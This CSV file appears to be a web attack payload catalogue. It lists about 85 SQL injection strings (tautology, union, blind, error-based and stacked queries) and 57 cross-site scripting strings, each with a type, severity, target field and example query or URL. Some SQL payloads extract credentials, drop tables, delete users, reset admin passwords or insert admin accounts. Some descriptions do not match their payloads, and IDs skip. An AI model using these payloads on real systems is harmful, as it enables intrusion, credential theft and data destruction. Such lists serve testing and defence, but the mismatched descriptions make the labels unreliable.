id,attack_class,payload,type,severity,context,description,example
sqli-001,sqli,' OR '1'='1,tautology,high,Login form username input,Basic tautology-based SQL injection,SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
sqli-002,sqli,"' UNION SELECT username, password FROM users--",union,high,Search input field,Union-based SQL injection to extract data,"SELECT name, description FROM products WHERE name = '' UNION SELECT username, password FROM users--"
sqli-003,sqli,'; WAITFOR DELAY '0:0:5'--,blind-time,medium,ID parameter in URL,Blind SQL injection with time delay,SELECT * FROM orders WHERE id = ''; WAITFOR DELAY '0:0:5'--
sqli-004,sqli,"' AND 1=CONVERT(int,@@version)--",error-based,medium,User ID input,Error-based SQL injection to reveal database version,"SELECT * FROM users WHERE id = '' AND 1=CONVERT(int,@@version)--"
sqli-005,sqli,' AND 1=1--,boolean-blind,medium,Search field,Boolean-based blind SQL injection,SELECT * FROM products WHERE name = '' AND 1=1--
sqli-006,sqli,'; DROP TABLE users--,stacked-queries,critical,User input in form,Stacked queries to execute multiple statements,SELECT * FROM users WHERE username = ''; DROP TABLE users--
sqli-007,sqli,' OR 1=1--,tautology,high,Login password field,Using comment to truncate query,SELECT * FROM users WHERE password = '' OR 1=1--
sqli-008,sqli,0x27 OR 0x31=0x31--,tautology,medium,URL parameter,Hex encoded payload,SELECT * FROM products WHERE id = 0x27 OR 0x31=0x31--
sqli-009,sqli,'; SELECT pg_sleep(5)--,blind-time,medium,PostgreSQL ID parameter,Using sleep for blind time-based injection,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(5)--
sqli-010,sqli,"' AND 1=CONVERT(int,USER())--",error-based,medium,User input,Extracting database user with error-based injection,"SELECT * FROM accounts WHERE user = '' AND 1=CONVERT(int,USER())--"
sqli-011,sqli,"' AND SUBSTRING(@@version,1,1)='5'--",boolean-blind,medium,Search input,Blind boolean-based injection with AND condition,"SELECT * FROM products WHERE name = '' AND SUBSTRING(@@version,1,1)='5'--"
sqli-012,sqli,' OR 'a'='a,tautology,high,Login username,Using OR with false condition to bypass filters,SELECT * FROM users WHERE username = '' OR 'a'='a' AND password = ''
sqli-013,sqli,' OR 1=1-- -,tautology,high,Search field,Using double dash comment to truncate query,SELECT * FROM items WHERE name = '' OR 1=1-- -
sqli-014,sqli,'//OR//1=1--,tautology,high,Login form,Using inline comment to bypass filters,SELECT * FROM users WHERE username = ''//OR//1=1--
sqli-015,sqli,' OR CAST('a' AS INT)=CAST('a' AS INT)--,tautology,medium,User input,Using cast to bypass filters,SELECT * FROM users WHERE username = '' OR CAST('a' AS INT)=CAST('a' AS INT)--
sqli-016,sqli,' OR SLEEP(5)--,blind-time,medium,ID parameter,Using sleep in MySQL for time-based blind injection,SELECT * FROM orders WHERE id = '' OR SLEEP(5)--
sqli-017,sqli,"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",error-based,high,User input,Using extractvalue for error-based injection,"SELECT * FROM users WHERE id = '' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
sqli-018,sqli,"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",error-based,high,User input,Using updatexml for error-based injection,"SELECT * FROM users WHERE id = '' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
sqli-019,sqli,'; SELECT pg_sleep(10)--,blind-time,medium,ID parameter,Using sleep in PostgreSQL for time-based injection,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(10)--
sqli-020,sqli,' OR 1=1#,tautology,high,Login form,Using OR with false condition and comment,SELECT * FROM users WHERE username = '' OR 1=1#
sqli-021,sqli,' OR SLEEP(10)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL,SELECT * FROM products WHERE name = '' OR SLEEP(10)--
sqli-022,sqli,"' UNION SELECT NULL, NULL, username, password FROM users--",union,high,Search field,Using UNION SELECT with NULLs to bypass column count,"SELECT id, name, description FROM products WHERE name = '' UNION SELECT NULL, NULL, username, password FROM users--"
sqli-023,sqli,' OR 1=1/*,tautology,high,Login username,Using OR with false condition and inline comment,SELECT * FROM users WHERE username = '' OR 1=1/*
sqli-024,sqli,' AND (SELECT COUNT(*) FROM users) > 0--,boolean-blind,medium,Search input,Using AND with subquery for blind boolean injection,SELECT * FROM products WHERE name = '' AND (SELECT COUNT(*) FROM users) > 0--
sqli-025,sqli,' OR pg_sleep(7)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL,SELECT * FROM orders WHERE id = '' OR pg_sleep(7)--
sqli-026,sqli,"' UNION SELECT database(), NULL--",union,high,Search input,Using UNION SELECT with database() function,"SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--"
sqli-027,sqli,'; WAITFOR DELAY '0:0:10'--,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:10'--
sqli-028,sqli,' OR CAST(1 AS INT)=1--,tautology,medium,Login form,Using OR with cast to bypass filters,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--
sqli-029,sqli,"' OR SUBSTRING(user(),1,1)='r'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='r'--"
sqli-030,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,blind-time,medium,User input,Using OR with sleep for time delay in Oracle,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--
sqli-031,sqli,"' UNION SELECT table_name, NULL FROM information_schema.tables--",union,high,Search input,Using UNION SELECT with information_schema.tables,"SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--"
sqli-032,sqli,' OR (SELECT sleep(5))--,blind-time,medium,ID parameter,Using OR with sleep for time delay in SQLite,SELECT * FROM orders WHERE id = '' OR (SELECT sleep(5))--
sqli-033,sqli,' OR 0x61646d696e=0x61646d696e--,tautology,medium,Login username,Using OR with hex encoded string,SELECT * FROM users WHERE username = '' OR 0x61646d696e=0x61646d696e--
sqli-034,sqli,' OR SLEEP(5)#,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with comment,SELECT * FROM products WHERE name = '' OR SLEEP(5)#
sqli-035,sqli,"' UNION SELECT user(), NULL--",union,high,Search input,Using UNION SELECT with user() function,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
sqli-036,sqli,' OR pg_sleep(3)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(3)--
sqli-037,sqli,'; WAITFOR DELAY '0:0:3'--,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server with comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:3'--
sqli-038,sqli,"' OR SUBSTRING(@@version,1,1)='5'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='5'--"
sqli-039,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--
sqli-040,sqli,"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",stacked-queries,critical,User input,Using stacked queries to insert data,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--"
sqli-041,sqli,' OR SLEEP(8)/*,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with inline comment,SELECT * FROM products WHERE name = '' OR SLEEP(8)/*
sqli-043,sqli,"' OR SUBSTRING(user(),1,1)='a'/*",boolean-blind,medium,Login input,Using OR with substring for blind boolean injection with inline comment,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='a'/*"
sqli-044,sqli,'; UPDATE users SET password='hacked' WHERE username='admin'--,stacked-queries,critical,User input,Using stacked queries to update data,SELECT * FROM users WHERE username = ''; UPDATE users SET password='hacked' WHERE username='admin'--
sqli-045,sqli,' OR pg_sleep(6)/*,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with inline comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(6)/*
sqli-046,sqli,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",union,high,Search input,Using UNION SELECT to extract column names,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
sqli-047,sqli,' OR CAST('1' AS INT)=1--,tautology,medium,Login form,Using OR with cast for tautology,SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--
sqli-048,sqli,'; WAITFOR DELAY '0:0:7'/*,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server with inline comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:7'/*
sqli-049,sqli,"' OR SUBSTRING(@@version,1,1)='8'#",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with hash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='8'#"
sqli-051,sqli,' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with inline comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/
sqli-052,sqli,'; DELETE FROM users WHERE username='guest'--,stacked-queries,critical,User input,Using stacked queries to delete data,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='guest'--
sqli-053,sqli,' OR 0x31=0x31--,tautology,medium,Login username,Using OR with hex encoded tautology,SELECT * FROM users WHERE username = '' OR 0x31=0x31--
sqli-054,sqli,' OR SLEEP(9)#,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with hash comment,SELECT * FROM products WHERE name = '' OR SLEEP(9)#
sqli-055,sqli,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",union,high,Search input,Using UNION SELECT to extract schema names,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
sqli-056,sqli,' OR pg_sleep(4)#,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with hash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(4)#
sqli-057,sqli,' OR CAST(1 AS INT)=1/*,tautology,medium,Login form,Using OR with cast for tautology with inline comment,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1/*
sqli-058,sqli,"' OR SUBSTRING(user(),1,1)='b'/*",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with inline comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='b'/*"
sqli-060,sqli,"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",stacked-queries,critical,User input,Using stacked queries to create new user,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--"
sqli-061,sqli,'; WAITFOR DELAY '0:0:5'#,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server with hash comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:5'#
sqli-062,sqli,"' OR SUBSTRING(@@version,1,1)='9'#",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with hash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='9'#"
sqli-064,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with hash comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#
sqli-065,sqli,'; DROP TABLE sessions--,stacked-queries,critical,User input,Using stacked queries to drop table,SELECT * FROM users WHERE username = ''; DROP TABLE sessions--
sqli-066,sqli,' OR 0x41=0x41--,tautology,medium,Login username,Using OR with hex encoded tautology with comment,SELECT * FROM users WHERE username = '' OR 0x41=0x41--
sqli-067,sqli,' OR SLEEP(11)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(11)--
sqli-069,sqli,' OR pg_sleep(12)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(12)--
sqli-070,sqli,'; UPDATE users SET password='newpass' WHERE username='admin'--,stacked-queries,critical,User input,Using stacked queries to update admin password,SELECT * FROM users WHERE username = ''; UPDATE users SET password='newpass' WHERE username='admin'--
sqli-071,sqli,' OR SLEEP(12)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(12)--
sqli-072,sqli,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",union,high,Search input,Using UNION SELECT to extract column names with comment,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--"
sqli-073,sqli,"' OR SUBSTRING(user(),1,1)='c'--",boolean-blind,medium,Login input,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='c'--"
sqli-074,sqli,"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",stacked-queries,critical,User input,Using stacked queries to insert admin user,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--"
sqli-075,sqli,' OR pg_sleep(8)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(8)--
sqli-076,sqli,"' UNION SELECT @@version, NULL--",union,high,Search input,Using UNION SELECT to extract database version,"SELECT name, description FROM products WHERE name = '' UNION SELECT @@version, NULL--"
sqli-078,sqli,'; WAITFOR DELAY '0:0:8'--,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server with double dash comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:8'--
sqli-079,sqli,"' OR SUBSTRING(@@version,1,1)='7'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='7'--"
sqli-081,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with double dash comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--
sqli-082,sqli,'; DELETE FROM users WHERE username='admin'--,stacked-queries,critical,User input,Using stacked queries to delete admin user,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='admin'--
sqli-083,sqli,' OR 0x42=0x42--,tautology,medium,Login username,Using OR with hex encoded tautology with double dash comment,SELECT * FROM users WHERE username = '' OR 0x42=0x42--
sqli-084,sqli,' OR SLEEP(13)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(13)--
sqli-086,sqli,' OR pg_sleep(14)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(14)--
sqli-088,sqli,"' OR SUBSTRING(user(),1,1)='d'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='d'--"
sqli-090,sqli,"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",stacked-queries,critical,User input,Using stacked queries to create new admin user,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--"
sqli-091,sqli,'; WAITFOR DELAY '0:0:9'--,blind-time,medium,User ID input,Using OR with sleepfor time delay in SQL Server with double dash comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:9'--
sqli-092,sqli,"' OR SUBSTRING(@@version,1,1)='6'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='6'--"
sqli-094,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with double dash comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--
sqli-096,sqli,' OR 0x43=0x43--,tautology,medium,Login username,Using OR with hex encoded tautology with double dash comment,SELECT * FROM users WHERE username = '' OR 0x43=0x43--
sqli-097,sqli,' OR SLEEP(14)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(14)--
sqli-099,sqli,' OR pg_sleep(15)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(15)--
sqli-100,sqli,'; UPDATE users SET password='securepass' WHERE username='admin'--,stacked-queries,critical,User input,Using stacked queries to update admin password with double dash comment,SELECT * FROM users WHERE username = ''; UPDATE users SET password='securepass' WHERE username='admin'--
xss-001,xss,<script>alert('XSS1')</script>,reflected,high,URL parameter,Basic reflected XSS with script tag,http://example.com/search?q=<script>alert('XSS1')</script>
xss-002,xss,<img src=x onerror=alert('XSS2')>,reflected,high,URL parameter,Reflected XSS with image tag and onerror event,http://example.com/search?q=<img src=x onerror=alert('XSS2')>
xss-003,xss,<script>alert('XSS3')</script>,stored,high,Comment input,Stored XSS with script tag in comment field,Submitting comment: <script>alert('XSS3')</script>
xss-004,xss,"<a href='javascript:alert(""XSS4"")'>click</a>",reflected,high,URL parameter,Reflected XSS with javascript: URI in anchor tag,"http://example.com/page?link=<a href='javascript:alert(""XSS4"")'>click</a>"
xss-005,xss,<input autofocus onfocus=alert('XSS5')>,reflected,high,URL parameter,Reflected XSS with input tag and onfocus event,http://example.com/search?q=<input autofocus onfocus=alert('XSS5')>
xss-006,xss,"<iframe src='javascript:alert(""XSS6"")'></iframe>",stored,high,User profile bio,Stored XSS with iframe tag,"User bio: <iframe src='javascript:alert(""XSS6"")'></iframe>"
xss-007,xss,<svg onload=alert('XSS7')>,reflected,high,URL parameter,Reflected XSS with SVG and onload event,http://example.com/search?q=<svg onload=alert('XSS7')>
xss-008,xss,<body onload=alert('XSS8')>,reflected,high,URL parameter,Reflected XSS with body tag and onload event,http://example.com/page?param=<body onload=alert('XSS8')>
xss-009,xss,<div onclick=alert('XSS9')>Click me</div>,stored,high,User input field,Stored XSS with event handler in div tag,User input: <div onclick=alert('XSS9')>Click me</div>
xss-010,xss,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>",reflected,high,URL parameter,Reflected XSS with meta refresh tag,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>"
xss-011,xss,"<style>body{background:url(""javascript:alert('XSS11')"")}</style>",reflected,high,URL parameter,Reflected XSS with style tag and expression,"http://example.com/page?param=<style>body{background:url(""javascript:alert('XSS11')"")}</style>"
xss-012,xss,%3Cscript%3Ealert('XSS12')%3C/script%3E,reflected,high,URL parameter,Reflected XSS with script tag and encoded payload,http://example.com/search?q=%3Cscript%3Ealert('XSS12')%3C/script%3E
xss-013,xss,<span onmouseover=alert('XSS13')>Hover me</span>,stored,high,User input field,Stored XSS with onmouseover event in span tag,User input: <span onmouseover=alert('XSS13')>Hover me</span>
xss-014,xss,"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>",reflected,high,URL parameter,Reflected XSS with iframe and srcdoc attribute,"http://example.com/page?param=<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>"
xss-015,xss,"<object data='javascript:alert(""XSS15"")'></object>",reflected,high,URL parameter,Reflected XSS with object tag and data attribute,"http://example.com/page?param=<object data='javascript:alert(""XSS15"")'></object>"
xss-016,xss,<form onsubmit=alert('XSS16')><input type='submit'></form>,stored,high,User input field,Stored XSS with form tag and onsubmit event,User input: <form onsubmit=alert('XSS16')><input type='submit'></form>
xss-017,xss,<video src=x onerror=alert('XSS17')></video>,reflected,high,URL parameter,Reflected XSS with video tag and onerror event,http://example.com/page?param=<video src=x onerror=alert('XSS17')></video>
xss-018,xss,<audio src=x onerror=alert('XSS18')></audio>,reflected,high,URL parameter,Reflected XSS with audio tag and onerror event,http://example.com/page?param=<audio src=x onerror=alert('XSS18')></audio>
xss-019,xss,<textarea onfocus=alert('XSS19')>Focus me</textarea>,stored,high,User input field,Stored XSS with textarea and onfocus event,User input: <textarea onfocus=alert('XSS19')>Focus me</textarea>
xss-020,xss,"<math href='javascript:alert(""XSS20"")'>X</math>",reflected,high,URL parameter,Reflected XSS with math tag and href attribute,"http://example.com/page?param=<math href='javascript:alert(""X20"")'>X</math>"
xss-021,xss,"<base href=""javascript:alert('XSS21');//"">",reflected,high,URL parameter,Reflected XSS with base tag and href attribute,"http://example.com/page?param=<base href=""javascript:alert('XSS21');//"">"
xss-022,xss,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>",stored,high,User input field,Stored XSS with anchor tag and onclick event,"User input: <a href='#' onclick='alert(""XSS22"")'>Click me</a>"
xss-023,xss,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>",reflected,high,URL parameter,Reflected XSS with meta tag and content attribute,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>"
xss-024,xss,"<button onclick='alert(""XSS24"")'>Click</button>",stored,high,User input field,Stored XSS with button tag and onclick event,"User input: <button onclick='alert(""XSS24"")'>Click</button>"
xss-025,xss,<form onreset=alert('XSS25')><input type='reset'></form>,reflected,high,URL parameter,Reflected XSS with form tag and onreset event,http://example.com/page?param=<form onreset=alert('XSS25')><input type='reset'></form>
xss-026,xss,<marquee onstart=alert('XSS26')>Scrolling text</marquee>,stored,high,User input field,Stored XSS with marquee tag and onstart event,User input: <marquee onstart=alert('XSS26')>Scrolling text</marquee>
xss-027,xss,"<embed src='javascript:alert(""XSS27"")'>",reflected,high,URL parameter,Reflected XSS with embed tag and src attribute,"http://example.com/page?param=<embed src='javascript:alert(""XSS27"")'>"
xss-028,xss,"<bgsound src='javascript:alert(""XSS28"")'>",stored,high,User input field,Stored XSS with bgsound tag and src attribute,"User input: <bgsound src='javascript:alert(""XSS28"")'>"
xss-029,xss,<xml onload=alert('XSS29')>,reflected,high,URL parameter,Reflected XSS with xml tag and onload event,http://example.com/page?param=<xml onload=alert('XSS29')>
xss-030,xss,"<iframe src='about:blank' onload='alert(""XSS30"")'></iframe>",stored,high,User input field,Stored XSS with iframe and onload event,"User input: <iframe src='about:blank' onload='alert(""XSS30"")'></iframe>"
xss-031,xss,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,reflected,high,URL parameter,Reflected XSS using SVG with animate element and begin attribute,http://example.com/page?param=<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
xss-032,xss,"<base href=""javascript:alert('XSS32');//"">",stored,high,User profile input,Stored XSS using JavaScript URI in base tag,"User profile: <base href=""javascript:alert('XSS32');//"">"
xss-033,xss,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,reflected,high,URL parameter,Reflected XSS using malformed iframe with srcdoc and encoded script,http://example.com/page?param=<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
xss-034,xss,"<div onpointerover='alert(""XSS34"")'>Hover me</div>",stored,high,User input field,Stored XSS using onpointerover event in div,"User input: <div onpointerover='alert(""XSS34"")'>Hover me</div>"
xss-035,xss,<script>alert(XSS35)</script>,reflected,high,URL parameter,Reflected XSS using malformed script tag with backticks,http://example.com/page?param=<script>alert(XSS35)</script>
xss-036,xss,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,stored,high,User input field,Stored XSS using SVG foreignObject with embedded HTML and script,User input: <svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
xss-037,xss,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>",reflected,high,URL parameter,Reflected XSS using onanimationstart event in div,"http://example.com/page?param=<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
xss-038,xss,"<input oninput='alert(""XSS38"")'>",stored,high,User input field,Stored XSS using input tag with oninput event,"User input: <input oninput='alert(""XSS38"")'>"
xss-039,xss,<script>eval(alert('XSS39'))</script>,reflected,high,URL parameter,Reflected XSS using malformed script with template literals,http://example.com/page?param=<script>eval(alert('XSS39'))</script>
xss-040,xss,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",stored,high,User input field,Stored XSS using object tag with data URI,"User input: <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
xss-041,xss,"<span onpointerdown='alert(""XSS41"")'>Click me</span>",reflected,high,URL parameter,Reflected XSS using onpointerdown event in span,"http://example.com/page?param=<span onpointerdown='alert(""XSS41"")'>Click me</span>"
xss-042,xss,"<math href='javascript:alert(""XSS42"")'>X</math>",stored,high,User input field,Stored XSS using math tag with href attribute and javascript URI,"User input: <math href='javascript:alert(""XSS42"")'>X</math>"
xss-043,xss,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>",reflected,high,URL parameter,Reflected XSS using iframe with sandbox attribute bypass,"http://example.com/page?param=<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
xss-044,xss,"<video oncanplay='alert(""XSS44"")'></video>",stored,high,User input field,Stored XSS using video tag with oncanplay event,"User input: <video oncanplay='alert(""XSS44"")'></video>"
xss-045,xss,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>",reflected,high,URL parameter,Reflected XSS using meta tag with refresh and encoded javascript URI,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
xss-046,xss,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>",stored,high,User input field,Stored XSS using svg with set attribute and onbegin event,"User input: <svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
xss-047,xss,"<script>setTimeout('alert(""XSS47"")',0)</script>",reflected,high,URL parameter,Reflected XSS using malformed script with setTimeout,"http://example.com/page?param=<script>setTimeout('alert(""XSS47"")',0)</script>"
xss-048,xss,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>",stored,high,User input field,Stored XSS using details tag with ontoggle event,"User input: <details ontoggle='alert(""XSS48"")'><summary>Click me</summary</details>"
xss-049,xss,"<input formaction='javascript:alert(""XSS49"")' type='submit'>",reflected,high,URL parameter,Reflected XSS using input tag with formaction attribute,"http://example.com/page?param=<input formaction='javascript:alert(""XSS49"")' type='submit'>"
xss-050,xss,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>",stored,high,User input field,Stored XSS using svg with animateMotion and onbegin event,"User input: <svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
xss-051,xss,"<script>setInterval(function(){alert('XSS51')},1000)</script>",reflected,high,URL parameter,Reflected XSS using script tag with setInterval,"http://example.com/page?param=<script>setInterval(function(){alert('XSS51')},1000)</script>"
xss-052,xss,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>",stored,high,User input field,Stored XSS using iframe with onload and srcdoc,"User input: <iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
xss-053,xss,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>",reflected,high,URL parameter,Reflected XSS using svg with onload and script tag,"http://example.com/page?param=<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
xss-054,xss,"<iframe src='javascript:alert(""XSS54"")'></iframe>",stored,high,User input field,Stored XSS using iframe with src set to javascript URI,"User input: <iframe src='javascript:alert(""XSS54"")'></iframe>"
xss-055,xss,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",reflected,high,URL parameter,Reflected XSS using object tag with type attribute and data URI,"http://example.com/page?param=<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
xss-056,xss,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>",stored,high,User input field,Stored XSS using svg with onload and setTimeout,"User input: <svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
xss-057,xss,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>",reflected,high,URL parameter,Reflected XSS using iframe with srcdoc and encoded script,"http://example.com/page?param=<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
